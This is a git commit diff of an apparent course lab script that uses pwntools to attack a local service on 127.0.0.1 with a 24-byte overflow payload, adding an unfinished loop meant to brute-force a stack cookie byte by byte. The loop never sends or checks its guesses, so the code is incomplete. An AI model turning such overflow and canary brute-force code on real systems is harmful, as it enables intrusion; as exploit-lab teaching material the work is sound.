9642a86a839b3a00909b7ab7035089c802c2bb5f
KieraConway <66643785+KieraConway@users.noreply.github.com>
2023-09-16 21:56:46 -0700

    Update client_sim2.py

--- Lab03/3-3/client_sim2.py
+++ Lab03/3-3/client_sim2.py
@@ -4,7 +4,9 @@ from pwn import *
 target_host = '127.0.0.1'
 target_port = 7033
 
-cookie
+COOKIE_LENGTH = 8
+cookie = [] 
+
 # Connect to the target
 p = remote(target_host, target_port)
 
@@ -13,20 +15,27 @@ try:
     initial_message = p.recvline()
     print(f"[*] Received initial message: {initial_message.decode()}")
 
-    # Send a line when prompted for a name
-    payload = b"A"*24 + ROOT_ID
+    #guess cookie here
+    for each_byte in range(COOKIE_LENGTH):
+        for each_value in range(256):
+            guess_byte = p8(each_value)
+
+            # Send a line when prompted for a name
+            payload = b"A"*24 + guess_byte
+        
+            #if guess is correct add to cookie list 
+            #check if correct by  spawn a thread for each guess or timeout method
+            # if wrong, move to next guess
+        
+
+
 
     p.sendline(payload)       # Send the payload
 
+    #if receive response, cookie guess correct, save to cookie list
     # Receive and print the response from the server
     response = p.recvline()
     print(f"[*] Received response: {response.decode()}")
-
-    # You can continue sending and receiving data as needed
-    # For example:
-    # p.sendline("Next input")
-    # next_response = p.recvline()
-    # print(f"[*] Received next response: {next_response.decode()}")
 
 finally:
     # Close the connection
